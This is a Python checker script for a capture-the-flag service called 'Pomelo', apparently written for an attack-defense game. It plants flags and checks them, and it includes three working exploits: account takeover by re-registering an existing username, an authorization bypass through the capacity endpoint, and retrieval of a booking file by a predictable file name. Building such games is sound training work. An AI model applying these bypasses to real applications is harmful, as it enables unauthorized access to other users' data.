import io
import json
import time
from dataclasses import dataclass
from datetime import datetime
from logging import LoggerAdapter
from typing import Optional, Tuple

from dataclasses_json import LetterCase, dataclass_json
from enochecker3 import ChainDB, Enochecker, ExploitCheckerTaskMessage, GetflagCheckerTaskMessage, MumbleException, PutflagCheckerTaskMessage
from enochecker3.utils import FlagSearcher, assert_equals
from faker import Faker
from httpx import AsyncClient, RequestError

faker = Faker()
checker = Enochecker("Pomelo", 5000)
app = lambda: checker.app
COOKIE_NAME = ".AspNetCore.Cookies"


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class EmployeeDto:
    id: int
    name: str
    department: str
    note: Optional[str]


@dataclass_json(letter_case=LetterCase.CAMEL)
@dataclass
class ProjectDto:
    id: int
    name: str
    begin: str
    end: str
    delivered_hours_timestamp: str


async def register_user(client: AsyncClient, employeeName: str, department: str, note: Optional[str], logger: LoggerAdapter) -> Tuple[EmployeeDto, str]:
    try:
        logger.debug(f"register_user({employeeName}, {department}")
        response = await client.post("/api/account/register", data={"employeeName": employeeName, "department": department, "note": note})
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/register request error")
    assert_equals(response.status_code, 200, "POST /api/account/register failed")

    try:
        cookie = response.cookies[COOKIE_NAME]
    except:
        raise MumbleException("POST /api/account/register did not set cookie")

    try:
        account = EmployeeDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/account/register returned unexpected data")
    return (account, cookie)


async def get_account(client: AsyncClient, logger: LoggerAdapter) -> EmployeeDto:
    try:
        logger.debug("get_account()")
        response = await client.get("/api/account/account")
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/account request error")

    assert_equals(response.status_code, 200, "GET /api/account/account failed")

    try:
        account = EmployeeDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/account/account returned unexpected data")

    return account


async def update_note(client: AsyncClient, note: str, logger: LoggerAdapter) -> EmployeeDto:
    try:
        logger.debug(f"update_note({note})")
        response = await client.post("/api/account/note", data={"note": note})
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/account/note request error")
    assert_equals(response.status_code, 200, "POST /api/account/note failed")

    try:
        account = EmployeeDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("POST /api/account/note returned unexpected data")

    return account


async def create_project(client: AsyncClient, name: str, begin: datetime, end: datetime, logger: LoggerAdapter) -> ProjectDto:
    try:
        logger.debug(f"create_project({name}, {begin}, {end})")
        response = await client.post("/api/project/project", data={"name": name, "begin": begin, "end": end})
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/project request error")
    assert_equals(response.status_code, 200, "POST /api/project/project failed")

    try:
        account = ProjectDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("POST /api/project/project returned unexpected data")

    return account


async def get_project(client: AsyncClient, id: int, logger: LoggerAdapter) -> ProjectDto:
    try:
        logger.debug(f"get_project({id})")
        response = await client.get(f"/api/project/project?projectId={id}")
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/project request error")

    assert_equals(response.status_code, 200, "GET /api/project/project failed")

    try:
        project = ProjectDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("GET /api/project/project returned unexpected data")

    return project


async def set_capacity(client: AsyncClient, employee_id: int, project_id: int, start: datetime, capacity: int, logger: LoggerAdapter) -> ProjectDto:
    try:
        response = await client.post("/api/project/capacity", data={"employeeId": employee_id, "projectId": project_id, "start": start, "capacity": capacity})
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/project/capacity request error")
    assert_equals(response.status_code, 200, "POST /api/project/capacity failed")

    try:
        account = ProjectDto.from_json(response.text)  # type: ignore
    except:
        raise MumbleException("POST /api/project/capacity returned unexpected data")

    return account


async def upload_booking(client: AsyncClient, project_id: int, file: str, logger: LoggerAdapter) -> str:
    try:
        response = await client.post(f"/api/booking/upload?projectId={project_id}", files={"file": io.StringIO(file)})
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("/api/booking/upload request error")
    assert_equals(response.status_code, 200, "POST /api/booking/upload failed")
    return response.text


async def download_booking(client: AsyncClient, url: str, logger: LoggerAdapter) -> str:
    try:
        response = await client.get(url)
        logger.debug(f"{response.status_code} {response.text}")
    except RequestError:
        raise MumbleException("GET booking request error")
    assert_equals(response.status_code, 200, "GET booking failed")
    return response.text


@checker.putflag(0)
async def putflag_user_note(task: PutflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    username0 = faker.name() + str(time.time())
    department = faker.bs()
    (_employee0, cookie0) = await register_user(session0, username0, department, task.flag, logger)
    await db.set("cookie0", cookie0)
    return json.dumps({"username": username0,})


@checker.getflag(0)
async def getflag_user_note(task: GetflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        cookie0 = await db.get("cookie0")
    except KeyError:
        raise MumbleException("Missing results from putflag")

    session0.cookies.set(COOKIE_NAME, cookie0)
    account = await get_account(session0, logger)
    assert_equals(task.flag, account.note, "Could not find flag in user note")
    # TODO also check department results from other account


@checker.putflag(1)
async def putflag_project_name(task: PutflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    username0 = faker.name() + str(time.time())
    department = faker.bs()
    (employee0, cookie0) = await register_user(session0, username0, department, None, logger)
    await db.set("cookie0", cookie0)

    begin = datetime.now()
    end = datetime.now()
    project = await create_project(session0, task.flag, begin, end, logger)
    await db.set("projectId", project.id)

    return json.dumps({"username": username0, "projectId": project.id,})


@checker.getflag(1)
async def getflag_project_name(task: GetflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        cookie0 = await db.get("cookie0")
        project_id = await db.get("projectId")
    except KeyError:
        raise MumbleException("Missing results from putflag")

    session0.cookies.set(COOKIE_NAME, cookie0)
    # TODO assert project is still in department?

    project = await get_project(session0, project_id, logger)
    assert_equals(task.flag, project.name, "Could not find flag in user note")
    # TODO also check department results from other account


@checker.putflag(2)
async def putflag_booking(task: PutflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    username0 = faker.name() + str(time.time())
    department = faker.bs()
    (employee0, cookie0) = await register_user(session0, username0, department, None, logger)
    await db.set("cookie0", cookie0)
    await db.set("department", department)

    begin = datetime.now()
    end = datetime.now()
    project = await create_project(session0, task.flag, begin, end, logger)
    await db.set("projectId", project.id)

    booking_url = await upload_booking(session0, project.id, f"{task.flag}\n{employee0.id},20", logger)
    await db.set("bookingUrl", booking_url)

    return json.dumps({"username": username0, "projectId": project.id,})


@checker.getflag(2)
async def getflag_booking(task: GetflagCheckerTaskMessage, session0: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    try:
        booking_url = await db.get("bookingUrl")
    except KeyError:
        raise MumbleException("Missing results from putflag")

    # TODO assert project is still in department

    booking = await download_booking(session0, booking_url, logger)
    assert_equals(booking.split("\n")[0], task.flag, "Could not find booking file")


@checker.exploit(0)
async def exploit_user_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    username = json.loads(task.attack_info)["username"]  # type: ignore
    department = faker.bs()

    (employee, cookie) = await register_user(client, username, department, None, logger)
    account = await update_note(client, "foo", logger)

    flag = searcher.search_flag(account.note)  # type: ignore
    if flag:
        return flag.decode()

    raise MumbleException("exploit failed")


@checker.exploit(1)
async def exploit_project_name(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    project_id = json.loads(task.attack_info)["projectId"]  # type: ignore

    (employee, _cookie) = await register_user(client, "Kevin", "Penispumpenshop24.de", None, logger)
    account = await set_capacity(client, employee.id, project_id, datetime.now(), 0, logger)

    flag = searcher.search_flag(account.name)
    if flag:
        return flag.decode()

    raise MumbleException("exploit failed")


@checker.exploit(2)
async def exploit_booking_file(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
    project_id = json.loads(task.attack_info)["projectId"]  # type: ignore

    booking = await download_booking(client, f"/Uploads/{project_id}_00000000-0000-0000-0000-000000000000.csv", logger)

    flag = searcher.search_flag(booking)
    if flag:
        return flag.decode()

    raise MumbleException("exploit failed")


if __name__ == "__main__":
    checker.run()
